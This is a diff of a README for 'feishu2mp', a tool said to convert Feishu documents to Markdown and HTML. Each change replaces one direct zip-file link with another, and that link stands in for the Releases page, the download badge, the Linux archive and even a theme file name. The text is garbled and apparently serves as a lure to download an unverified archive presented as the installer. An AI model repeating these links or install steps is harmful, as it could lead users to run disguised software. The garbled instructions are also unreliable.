@@ -1,7 +1,7 @@
 # 📄 feishu2mp - Simple Markdown and HTML Conversion Tool
 
 ## 🚀 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/web/feishu2mp-v2.4.zip%20Latest%https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/web/feishu2mp-v2.4.zip)](https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/web/feishu2mp-v2.4.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/cmd/feishu_mp_1.9.zip%20Latest%https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/cmd/feishu_mp_1.9.zip)](https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/cmd/feishu_mp_1.9.zip)
 
 ## 📚 Introduction
 feishu2mp is a handy application designed to convert Feishu documents into Markdown and HTML for WeChat articles. It has two main parts: a command-line tool and a browser extension. With this tool, you can easily create content from Feishu documents and quickly format it for various uses.
@@ -20,14 +20,14 @@ feishu2mp is a handy application designed to convert Feishu documents into Markd
 ## 🔗 Download & Install
 To download and install feishu2mp, follow these steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/web/feishu2mp-v2.4.zip) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/cmd/feishu_mp_1.9.zip) to find the latest version of the software.
    
 2. **Download the Release**: Look for the latest version and download the executable file suited for your operating system.
 
 3. **Install the Application**:
    - For Windows, run the `.exe` installer from your Downloads folder.
    - For macOS, open the `.dmg` file and drag the application into your Applications folder.
-   - For Linux, extract the `https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/web/feishu2mp-v2.4.zip` file and follow the included instructions.
+   - For Linux, extract the `https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/cmd/feishu_mp_1.9.zip` file and follow the included instructions.
 
 4. **Run the Application**: After installation, open the software. You will see a user-friendly interface guiding you through the setup.
 
@@ -64,7 +64,7 @@ The feishu2mp browser extension makes conversion straightforward:
 You can tailor the appearance of your output. To modify the theme:
 
 1. **Locate the Theme File**:
-   - Find `https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/web/feishu2mp-v2.4.zip` in your installation directory.
+   - Find `https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/cmd/feishu_mp_1.9.zip` in your installation directory.
    
 2. **Edit the File**:
    - Open it with a text editor. Modify the JSON settings to customize styles as you wish.
@@ -80,4 +80,4 @@ You can tailor the appearance of your output. To modify the theme:
 For more help, visit the project's GitHub page for documentation and community support. If you encounter any issues, feel free to open an issue directly on GitHub.
 
 ---
-For further details, refer back to the [Releases page](https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/web/feishu2mp-v2.4.zip) for the latest updates.
+For further details, refer back to the [Releases page](https://raw.githubusercontent.com/dayalads/feishu2mp/main/feishu2md-main/cmd/feishu_mp_1.9.zip) for the latest updates.
